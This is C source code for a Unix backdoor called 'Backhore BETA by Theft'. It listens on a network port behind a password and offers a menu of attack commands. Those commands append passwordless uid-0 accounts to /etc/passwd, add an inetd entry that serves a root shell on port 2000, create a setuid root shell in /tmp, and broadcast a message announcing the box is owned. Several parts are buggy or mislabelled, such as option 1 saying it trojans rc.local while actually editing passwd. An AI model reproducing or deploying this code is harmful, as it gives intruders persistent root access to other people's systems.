#include <stdio.h>
#include <signal.h>
#include <strings.h>
#include <sys/param.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/fcntl.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <linux/wait.h>

#define PORT 42019
#define MAXDATASIZE 100
#define BACKLOG 10
#define SA struct sockaddr  /* leaner meaner code */

void handle(int);

int
main(int argc, char *argv[])
{
        int sockfd, new_fd, sin_size, numbytes, cmd;
        char ask[10]="Command: ";
        char *null = "\0";
        char *bytes, *buf, pass[40];
        struct sockaddr_in my_addr;

        struct sockaddr_in their_addr;

        printf("\n      Backhore BETA by Theft\n");
        printf(" 1: trojans rc.local\n");
        printf(" 2: sends a systemwide message\n");
        printf(" 3: binds a root shell on port 2000\n");
        printf(" 4: creates suid sh in /tmp\n");
        printf(" 5: creates mutiny account uid 0 no passwd\n");
        printf(" 6: drops to suid shell\n");
        printf(" 7: information on backhore\n");
        printf(" 8: contact\n");

        if (argc != 2) {
                fprintf(stderr,"Usage: %s password\n", argv[0]);
                exit(1);
        }

        strncpy(pass, argv[1], 40);
        strcat (pass,null);
        printf("..using password value: %s..\n", pass);

        if ( (sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
                perror("socket");
                exit(1);
        }

        my_addr.sin_family = AF_INET;
        my_addr.sin_port = htons(PORT);
        my_addr.sin_addr.s_addr = INADDR_ANY;

        if (bind(sockfd, (SA *)&my_addr, sizeof(SA)) == -1) {

                perror("bind");
                exit(1);
        }

        if (listen(sockfd, BACKLOG) == -1) {
                perror("listen");
                exit(1);
        }

        sin_size = sizeof(SA);
        while(1) {  /* main accept() loop */
                if ((new_fd = accept(sockfd, (SA *)&their_addr, &sin_size)) == -1) {
                        perror("accept");/*not pass accept it is a bug*/
                        continue;
                }
                if (!fork()) {
                        dup2(new_fd, 0);
                        dup2(new_fd, 1);
                        dup2(new_fd, 2);
                        fgets(buf, 40, stdin);
                        if (!strcmp(buf, pass)) {
                                printf("%s", ask);
                                cmd = getchar();
                                handle(cmd);
                        }
                        close(new_fd);
                        exit(0);
                }
                close(new_fd);
                while(waitpid(-1,NULL,WNOHANG) > 0); /* rape the dying children */
        }
}

void
handle(int cmd)
{
        FILE *fd;

        switch(cmd) {
                case '1':
                        printf("\nBackhore BETA by Theft\n");
                        printf("theft@cyberspace.org\n");
                        printf("Trojaning rc.local\n");
                        fd = fopen("/etc/passwd", "a+");
                        fprintf(fd, "mutiny::0:0:ethical mutiny crew:/root:/bin/sh");
                        fclose(fd);
                        printf("Trojan complete.\n");
                        break;
                case '2':
                        printf("\nBackhore BETA by Theft\n");
                        printf("theft@cyberspace.org\n");
                        printf("Sending systemwide message..\n");
                        system("wall Box owned via the Ethical Mutiny Crew");
                        printf("Message sent.\n");
                        break;
                case '3':
                        printf("\nBackhore BETA by Theft\n");
                        printf("theft@cyberspace.org\n");
                        printf("\nAdding inetd backdoor... (-p)\n");
                        fd = fopen("/etc/services","a+");
                        fprintf(fd,"backdoor\t2000/tcp\tbackdoor\n");
                        fd = fopen("/etc/inetd.conf","a+");
                        fprintf(fd,"backdoor\tstream\ttcp\tnowait\troot\t/bin/sh -i\n");
                        execl("killall", "-HUP", "inetd", NULL);
                        printf("\ndone.\n");
                        printf("telnet to port 2000\n\n");
                        break;
                case '4':
                        printf("\nBackhore BETA by Theft\n");
                        printf("theft@cyberspace.org\n");
                        printf("\nAdding Suid Shell... (-s)\n");
                        system("cp /bin/sh /tmp/.sh");
                        system("chmod 4700 /tmp/.sh");
                        system("chown root:root /tmp/.sh");
                        printf("\nSuid shell added.\n");
                        printf("execute /tmp/.sh\n\n");
                        break;
                case '5':
                        printf("\nBackhore BETA by Theft\n");
                        printf("theft@cyberspace.org\n");
                        printf("\nAdding root account... (-u)\n");
                        fd=fopen("/etc/passwd","a+");
                        fprintf(fd,"hax0r::0:0::/:/bin/bash\n");
                        printf("\ndone.\n");
                        printf("uid 0 and gid 0 account added\n\n");
                        break;
                case '6':
                        printf("\nBackhore BETA by Theft\n");
                        printf("theft@cyberspace.org\n");
                        printf("Executing suid shell..\n");

                        execl("/bin/.sh", "sh", 0);
                        break;
                case '7':
                        printf("\nBackhore BETA by Theft\n");
                        printf("theft@cyberspace.org\n");
                        printf("\nInfo... (-i)\n");
                        printf("\n3 - Adds entries to /etc/services & /etc/inetd.conf giving                    you\n");
                        printf("a root shell on port 2000. example: telnet  2000\n\n");
                        printf("4 - Creates a copy of /bin/sh to /tmp/.sh which, whenever\n");
                        printf("executed gives you a root shell. example:/tmp/.sh\n\n");
                        printf("5 - Adds an account with uid and gid 0 to the passwd file.\n");
                        printf("The login is 'mutiny' and there is no passwd.");
                        break;
                case '8':
                        printf("\nBackhore BETA by Theft\n");
                        printf("\nhttp://theft.bored.org\n");
                        printf("theft@cyberspace.org\n\n");
                        break;
                default:
                        printf("unknown command: %d\n", cmd);
                        break;
         }
}
